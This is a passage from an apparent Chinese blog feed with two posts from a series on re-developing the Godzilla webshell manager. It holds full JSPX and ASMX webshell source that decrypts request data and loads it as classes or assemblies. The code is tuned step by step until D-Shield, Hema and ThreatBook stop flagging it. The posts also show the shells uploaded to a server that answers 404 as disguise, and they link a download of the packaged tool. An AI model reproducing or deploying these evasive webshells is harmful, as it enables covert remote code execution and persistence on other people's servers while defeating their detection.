leadsec.encodeToString(webray);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">public <span class="keyword">static</span> byte[] base64Decode(<span class="built_in">String</span> bs) throws Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            java.util.Base64.Decoder nsfocus = java.util.Base64.getDecoder();</span><br><span class="line">            <span class="keyword">return</span> nsfocus.decode(bs);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;<span class="keyword">return</span> <span class="literal">null</span>;&#125;</span><br><span class="line">    &#125;<span class="class"><span class="keyword">class</span> <span class="title">huawei</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">        public <span class="function"><span class="title">huawei</span>(<span class="params">ClassLoader sina</span>)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(sina);</span><br><span class="line">        &#125;</span><br><span class="line">       public Class <span class="function"><span class="title">Q</span>(<span class="params">byte[] bytedance</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(<span class="literal">null</span>, bytedance, <span class="number">0</span>, bytedance.length);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后就是用于获取当前类的类加载器<code>this.getClass().getClassLoader()</code>这个语句d盾也杀，我们给他换掉<code>ClassLoader.getSystemClassLoader()</code>这样就降级了</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250206154642813.png" alt="image-20250206154642813"></p><p>2级，经过笔者在fuzz，<code>Object f=((Class)session.getAttribute(&quot;payload&quot;)).newInstance();f.equals(arrOut);f.equals(pageContext);</code></p><p>问题出现在.newInstance();</p><p>但是在哥斯拉二开从0到1-2免杀的文章中，笔者测试的jsp免杀，并没有对这一点进行查杀。所以肯定还是哪里有问题出现在下面最后一段里。因为jsp和jspx的木马都差不多，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:scriptlet&gt;try&#123;byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute(&quot;payload&quot;)==null)&#123;session.setAttribute(&quot;payload&quot;,new X(this.getClass().getClassLoader()).Q(data));&#125;else&#123;request.setAttribute(&quot;parameters&quot;,data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute(&quot;payload&quot;)).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));&#125; &#125;catch (Exception e)&#123;&#125;</span><br><span class="line">&lt;/jsp:scriptlet&gt;</span><br></pre></td></tr></table></figure><p>这里.newInstance();如果没问题，大概率是<code>&lt;jsp:scriptlet&gt;</code>这种声明有问题了。</p><p>参考大师傅文章<a href="https://yzddmr6.com/posts/jsp-webshell-upload-bypass/">https://yzddmr6.com/posts/jsp-webshell-upload-bypass/</a> 可以发现，其中<a href="jsp:scriptlet">jsp:scriptlet</a>可以将jsp换掉的。换成任意字符都可以。这里也可以怀疑是d盾检测了jsp字符串，确实挺可疑的。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250207104054740.png" alt="image-20250207104054740"></p><p>这样就过掉d盾了。接下来再将其他的细节优化一下。没用的空格，字符串去掉即可。</p><p>好的，用一点时间，把木马放到模板里。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250208113713958.png" alt="image-20250208113713958"></p><p> 编译打包，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250208141334288.png" alt="image-20250208141334288"></p><p>大家记得使用的时候选这个jspx的</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250208141556870.png" alt="image-20250208141556870"></p><p>选择jspx的。照例生成三个</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250208142322997.png" alt="image-20250208142322997"></p><p>传上去  访问一下</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250208143608371.png" alt="image-20250208143608371"></p><p>这里笔者也做了404的🐎，这个404显示正常的，文件存在的。</p><p>火狐</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250208143805781.png" alt="image-20250208143805781"></p><p>tomcat 如果不存在的文件，返回应该是下面这样的</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250208143647148.png" alt="image-20250208143647148"></p><p>大家连接的时候选择<code>JAVA_AES_BASE64_DATA_JSPX</code></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250208143927656.png" alt="image-20250208143927656"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250208144131065.png" alt="image-20250208144131065"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250208144107065.png" alt="image-20250208144107065"></p><p>看下流量，也没啥问题，返回码是404。<code>LF/IpkPvM0iJI4wmpBs2DaoBVvcbDMpwuL7nYS3n/k4=</code></p><p>大家看到这个是不是很熟悉，这个是大家用了默认key加密得来的test结果。很容易被识别。建议大家在使用的时候千万不要使用默认pass和key。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250208144345015.png" alt="image-20250208144345015"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-6/image-20250208144354634.png" alt="image-20250208144354634"></p><p>好，在看一下微步，也没啥问题。其他的就不测了。这样jspx的也改完了。</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>本文对godzilla中jspx木马进行免杀，及流量修改进行简单免杀，将免杀木马封装到godzilla中，使用模板进行免杀，达到每次生成的木马都不相同。</p><h5 id="下个版本"><a href="#下个版本" class="headerlink" title="下个版本"></a>下个版本</h5><p>1.1版本添加木马的免杀，全语言都做好了，但是并没有改流量以及加密方式，只是做了伪装。</p><p>1.2版本做了动态密钥。</p><p>1.3版本做了左右动态添加数据，</p><p>1.4版本做了asmx动态免杀及流量修改。</p><p>1.5版本做了jspx动态免杀及流量修改。</p><p>后面需要做的：修改一下加密方式，这样的话会更好一点。还有就是data其实是固定的，希望能让他动起来。</p><h5 id="下载、使用"><a href="#下载、使用" class="headerlink" title="下载、使用"></a>下载、使用</h5><p>什么，你说看不明白、不想动手、太麻烦，没事，去下载就可以了。<br><a href="https://github.com/Bohemiana/godzilla_erkai">https://github.com/Bohemiana/godzilla_erkai</a></p><h5 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h5><p>最后感谢您读到现在，这篇文章匆忙构成肯定有不周到或描述不正确的地方，期待业界师傅们用各种方式指正勘误。</p><h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BeichenDream/Godzilla            原版哥斯拉</span><br><span class="line">https://zone.huoxian.cn/d/1229-jspwebshell  JSPwebshell免杀一些技巧</span><br><span class="line">https://yzddmr6.com/posts/jsp-webshell-upload-bypass/ 星球问答：一次jsp上传绕过的思考</span><br></pre></td></tr></table></figure><blockquote><p>emmm 太菜了<br>一直在路上</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> godzilla </tag>
            
            <tag> 二开 </tag>
            
            <tag> jspx免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哥斯拉二开从0到1-5(asmx免杀)</title>
      <link href="/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/"/>
      <url>/2025/01/24/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/</url>
      
        <content type="html"><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>上面的文章做了动态的免杀，以及基于时间的密钥动态处理，计划中做一下其他语言的免杀及流量修改，本篇文章做一下asmx流量修改及免杀。</p><h5 id="asmx简介"><a href="#asmx简介" class="headerlink" title="asmx简介"></a>asmx简介</h5><p><code>ASMX</code> 文件是一个用于在 ASP.NET Web 服务中定义和处理请求的文件格式。它通常用于创建基于 XML 的 Web 服务，允许客户端与服务器进行远程交互，传输数据并执行方法。ASMX 文件通常包含服务的代码和定义，用来处理 Web 服务的请求和响应。</p><p>Web 服务（也叫做 XML Web Service）是一种能够接收来自互联网或局域网中其他系统的请求，提供轻量级通信的独立技术。Web 服务通过 SOAP 协议在 Web 上提供功能，通常由 WSDL 文件描述，并通过 UDDI 注册。</p><ol><li><strong>SOAP</strong>（简单对象访问协议）：它是 XML Web 服务的通信协议，定义了如何通过 HTTP 或其他底层协议来调用 Web 服务中的方法。SOAP 使用 XML 格式的消息进行通信。</li><li><strong>WSDL</strong>（Web 服务描述语言）：一个 XML 文档，用于描述 Web 服务的操作以及如何交换数据。WSDL 文件通常由软件自动生成，并且可以通过 UDDI 进行注册。</li><li><strong>UDDI</strong>（统一描述、发现与集成）：一种标准的 Web 服务目录，允许 Web 服务注册并被其他系统发现。</li></ol><p>.asmx是webservice服务程序的后缀名，ASP.NET 使用.asmx 文件来对Web Services的支持。.asmx 文件和.aspx文件一样都属于文本文件。它包含在.aspx文件之中，成为ASP.NET应用程序的一部分。</p><p>具有 .asmx 扩展名的文件是一种 ASP.NET Web 服务文件，它使用简单对象访问协议 (SOAP) 在 Internet 上提供两个对象之间的通信。它作为服务部署在基于 Windows 的 Web 服务器上，用于处理传入请求并返回响应。与包含 ASP.NET 网页可视化显示代码的ASPX文件不同，ASMX 文件在后台运行在服务器上，并执行不同的任务，例如连接数据库、检索数据和返回数据提出请求的格式。这些专门用于 XML Web 服务。</p><p>说那么多，不如一见，我们在打战的时候经常会见到这种页面，那么这种也页面就是采用的这种形式。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250124180239062.png" alt="image-20250124180239062"></p><p>来看一下传参方式，这里是一个计算器，有四种方法，加减乘除。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126164320685.png" alt="image-20250126164320685"></p><p>这里选择加，可以看到有两个参数num，采用xml的传参方式</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/aspx/time/calc.asmx</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.205</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/xml; charset=utf-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>length</span><br><span class="line"><span class="attribute">SOAPAction</span><span class="punctuation">: </span>&quot;http://tempuri.org/Add&quot;</span><br><span class="line"></span><br><span class="line"><span class="xml"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">soap:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="attr">xmlns:xsd</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema&quot;</span> <span class="attr">xmlns:soap</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">Add</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://tempuri.org/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">num1</span>&gt;</span>double<span class="tag">&lt;/<span class="name">num1</span>&gt;</span></span></span><br><span class="line"><span class="xml">      <span class="tag">&lt;<span class="name">num2</span>&gt;</span>double<span class="tag">&lt;/<span class="name">num2</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;/<span class="name">Add</span>&gt;</span></span></span><br><span class="line"><span class="xml">  <span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126164744661.png" alt="image-20250126164744661"></p><p>这里经过笔者测试，这个<code>SOAPAction: &quot;http://tempuri.org/Add&quot;</code>经过测试是可以去掉的。不写这一句也没问题。以下咱们就给他去掉好了，少一句话，就少一个特征，宁可信其有，不可以信其无。好，本编主要看的是asmx免杀这里就简单讲一下格式，一会还会看到。</p><h5 id="asmx免杀"><a href="#asmx免杀" class="headerlink" title="asmx免杀"></a>asmx免杀</h5><p>先简单来看一下哥斯拉原版asmx木马。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ WebService Language=&quot;C#&quot; Class=&quot;WebService1&quot; %&gt;</span><br><span class="line">public class WebService1 : System.Web.Services.WebService</span><br><span class="line">&#123;</span><br><span class="line">    [System.Web.Services.WebMethod(EnableSession = true)]</span><br><span class="line">    public string asd(string asd)</span><br><span class="line">    &#123;</span><br><span class="line">        System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">            string key = &quot;544e864796f05937&quot;;</span><br><span class="line">            string bohemian_pass = &quot;asd&quot;;</span><br><span class="line">            string md5 = System.BitConverter.ToString(</span><br><span class="line">                new System.Security.Cryptography.MD5CryptoServiceProvider()</span><br><span class="line">                .ComputeHash(System.Text.Encoding.Default.GetBytes(asd_pass + key))</span><br><span class="line">            ).Replace(&quot;-&quot;, &quot;&quot;);</span><br><span class="line">            byte[] data = System.Convert.FromBase64String(System.Web.HttpUtility.UrlDecode(bohemian));</span><br><span class="line">            data = new System.Security.Cryptography.RijndaelManaged()</span><br><span class="line">                .CreateDecryptor(</span><br><span class="line">                    System.Text.Encoding.Default.GetBytes(key), </span><br><span class="line">                    System.Text.Encoding.Default.GetBytes(key)</span><br><span class="line">                )</span><br><span class="line">                .TransformFinalBlock(data, 0, data.Length);</span><br><span class="line"></span><br><span class="line">            if (Context.Session[&quot;payload&quot;] == null)</span><br><span class="line">            &#123;</span><br><span class="line">                Context.Session[&quot;payload&quot;] = (System.Reflection.Assembly)</span><br><span class="line">                    typeof(System.Reflection.Assembly)</span><br><span class="line">                    .GetMethod(&quot;Load&quot;, new System.Type[] &#123; typeof(byte[]) &#125;)</span><br><span class="line">                    .Invoke(null, new object[] &#123; data &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                object o = ((System.Reflection.Assembly)Context.Session[&quot;payload&quot;]).CreateInstance(&quot;LY&quot;);</span><br><span class="line">                System.IO.MemoryStream outStream = new System.IO.MemoryStream();</span><br><span class="line">                o.Equals(Context);</span><br><span class="line">                o.Equals(outStream);</span><br><span class="line">                o.Equals(data);</span><br><span class="line">                o.ToString();</span><br><span class="line">                byte[] r = outStream.ToArray();</span><br><span class="line">                stringBuilder.Append(md5.Substring(0, 16));</span><br><span class="line">                stringBuilder.Append(</span><br><span class="line">                    System.Convert.ToBase64String(</span><br><span class="line">                        new System.Security.Cryptography.RijndaelManaged()</span><br><span class="line">                        .CreateEncryptor(</span><br><span class="line">                            System.Text.Encoding.Default.GetBytes(key), </span><br><span class="line">                            System.Text.Encoding.Default.GetBytes(key)</span><br><span class="line">                        )</span><br><span class="line">                        .TransformFinalBlock(r, 0, r.Length)</span><br><span class="line">                    )</span><br><span class="line">                );</span><br><span class="line">                stringBuilder.Append(md5.Substring(16));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch (System.Exception)</span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        return stringBuilder.ToString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单看一下，其实和aspx的木马差不多的。无非是一些细节上不一样。加载方式、函数啥的。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126165948109.png" alt="image-20250126165948109"></p><p>放到d盾中，5级。我们进行一下简单fuzz。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126170127598.png" alt="image-20250126170127598"></p><p>直接删一般，看到报2级，应该是还有问题。</p><p>根据以往经验，大概率是加密问题，data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(</p><p>这句中RijndaelManaged这个函数，是加密使用的，我们给他删掉</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126170417879.png" alt="image-20250126170417879"></p><p>这样就没问题了，那么还是要用的，经过搜索，我们可以用<code>AesManaged()</code>函数代替</p><p><code>data = new System.Security.Cryptography..CreateDecryptor(changshangsan, changshangsan).TransformFinalBlock(data, 0, data.Length);</code>也就是说像这样写就可以了。</p><p>刚刚删掉的那一段拿回来继续fuzz一下。</p><p>这里fuzz后是<code> Context.Session[&quot;payload&quot;] = (System.Reflection.Assembly)                     typeof(System.Reflection.Assembly)                     .GetMethod(&quot;Load&quot;, new System.Type[] &#123; typeof(byte[]) &#125;)                     .Invoke(null, new object[] &#123; data &#125;);</code></p><p>可以看到是加载data的，我们进行改写一下，笔者在fuzz的时候，大概率是load或者payload的问题，还有这个invoke，也是威胁的。</p><p><code>            if (Context.Session[&quot;changshangyi&quot;] == null) &#123;     AppDomain currentDomain = AppDomain.CurrentDomain;     byte[] assemblyData = data;     System.IO.MemoryStream assemblyStream = new System.IO.MemoryStream(assemblyData);     System.Reflection.Assembly assembly = currentDomain.Load(assemblyStream.ToArray());     Context.Session[&quot;changshangyi&quot;] = assembly;</code></p><p>写的时候，我们给他换种写法，把关键字给他去掉</p><p>data为获取到的很多方法</p><p><strong><code>system.IO.MemoryStream assemblyStream = new System.IO.MemoryStream(assemblyData);</code></strong></p><ul><li>使用字节数组 <code>assemblyData</code> 创建一个内存流对象 <code>assemblyStream</code>。</li><li>内存流允许字节数组的操作模拟文件流，方便后续处理。</li></ul><p><strong><code>System.Reflection.Assembly assembly = currentDomain.Load(assemblyStream.ToArray());</code></strong></p><ul><li>将内存流的数据转换为字节数组并加载为程序集 (<code>Assembly</code>) 对象。</li><li><strong><code>currentDomain.Load</code></strong> 会在当前应用程序域中动态加载该程序集，类似于运行时将 DLL 文件加载进来。</li></ul><p>在同一个用户的后续请求中，代码可以直接从 <code>Session</code> 获取已经加载的程序集，而不必重复加载。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126171955261.png" alt="image-20250126171955261"></p><p>这样，我们就改好了，这样就没有问题了。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126172311033.png" alt="image-20250126172311033"></p><p>看一下是否能用。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126172336812.png" alt="image-20250126172336812"></p><p>使用起来也没有问题。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126172402151.png" alt="image-20250126172402151"></p><p>好的，我们来看看其他平台。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126172525677-17378835258941.png" alt="image-20250126172525677"></p><p>这里我们可以看到河马直接就给杀了，还识别出来是godzilla。</p><p>我们在进行fuzz。经过笔者fuzz后，我发现是MD5的锅。只要有md5就报。</p><p> string md5 = System.BitConverter.ToString(<br>                new System.Security.Cryptography.MD5CryptoServiceProvider()<br>                .ComputeHash(System.Text.Encoding.Default.GetBytes(bohemian_pass + key))<br>            ).Replace(“-“, “”);</p><p>原版的木马中是加载了md5的，这里可以看到。我们知道，godzilla，在木马层面，md5在木马中的作用主要是将pass+key进行MD5，上几期都知道，我们改过的流量，不在进行md5做识别了，所以，一会我们将不会用到md5了，直接在木马中删掉md5就可以了。一会在定义一个其他的。</p><p>试下河马</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126173336923.png" alt="image-20250126173336923"></p><p>ok，这样就没问题了。</p><p>这样就差不多了，我们在优化一下其中的一些字符串，在其他平台可能不行。比如payload，或者一些变量的定义啥的，都给他改改。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ WebService Language=&quot;C#&quot; Class=&quot;WebService1&quot; %&gt;</span><br><span class="line">using System;</span><br><span class="line">public class WebService1 : System.Web.Services.WebService</span><br><span class="line">&#123;</span><br><span class="line">    [System.Web.Services.WebMethod(EnableSession = true)]</span><br><span class="line">    public string asd(string asd)</span><br><span class="line">    &#123;</span><br><span class="line">        System.Text.StringBuilder changshansi = new System.Text.StringBuilder();</span><br><span class="line">        </span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">        </span><br><span class="line">            byte[] changshangsan = System.Text.Encoding.Default.GetBytes(&quot;7815696ecbf1c96e&quot;);</span><br><span class="line">            byte[] changshangjiu = System.Convert.FromBase64String(System.Web.HttpUtility.UrlDecode(asd));</span><br><span class="line">            changshangjiu = new System.Security.Cryptography.AesManaged()</span><br><span class="line">                    .CreateDecryptor(changshangsan, changshangsan)</span><br><span class="line">                    .TransformFinalBlock(changshangjiu, 0, changshangjiu.Length);</span><br><span class="line">            if (Context.Session[&quot;changshangyi&quot;] == null)</span><br><span class="line">&#123;</span><br><span class="line">    AppDomain currentDomain = AppDomain.CurrentDomain;</span><br><span class="line">    byte[] changshangqi = changshangjiu;</span><br><span class="line">    System.IO.MemoryStream changshangliu = new System.IO.MemoryStream(changshangqi);</span><br><span class="line">    System.Reflection.Assembly changshangwu = currentDomain.Load(changshangliu.ToArray());</span><br><span class="line">    Context.Session[&quot;changshangyi&quot;] = changshangwu;</span><br><span class="line">&#125;else&#123;object changshanger = ((System.Reflection.Assembly)Context.Session[&quot;changshangyi&quot;])</span><br><span class="line">                            .CreateInstance(&quot;LY&quot;);</span><br><span class="line">                System.IO.MemoryStream changshangshi = new System.IO.MemoryStream();</span><br><span class="line">                changshanger.Equals(Context);</span><br><span class="line">                changshanger.Equals(changshangshi);</span><br><span class="line">                changshanger.Equals(changshangjiu);</span><br><span class="line">                changshanger.ToString();</span><br><span class="line">                byte[] r = changshangshi.ToArray();</span><br><span class="line">                string qwe = &quot;&lt;data&gt;&quot;;</span><br><span class="line">                changshansi.Append(qwe);</span><br><span class="line">                changshansi.Append(System.Convert.ToBase64String(</span><br><span class="line">                    new System.Security.Cryptography.AesManaged()</span><br><span class="line">                        .CreateEncryptor(changshangsan, changshangsan)</span><br><span class="line">                        .TransformFinalBlock(r, 0, r.Length)));</span><br><span class="line">                      changshansi.Append(qwe);  </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch (System.Exception)</span><br><span class="line">        &#123;</span><br><span class="line">            // Handle exceptions here (optional)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return changshansi.ToString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概就是这样。对一些字符串进行可简单优化</p><p>这里原版木马有一句<code>string bohemian_pass = &quot;asd&quot;;</code> 这个乍一看就是定义的密码，其实全文追下来会发现，并没有调用这个，索性，也给他去掉了。</p><p>vt，其实vt对webshell类不感冒的。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126174824604.png" alt="image-20250126174824604"></p><p>微步</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126175046630.png" alt="image-20250126175046630"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126175100822.png" alt="image-20250126175100822"></p><p>其他的火绒 360就不测试了。也没啥问题。</p><h5 id="asmx流量修改"><a href="#asmx流量修改" class="headerlink" title="asmx流量修改"></a>asmx流量修改</h5><p>免杀已经做完了，那接下来就是流量修改了。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-5/image-20250126180015692.png" 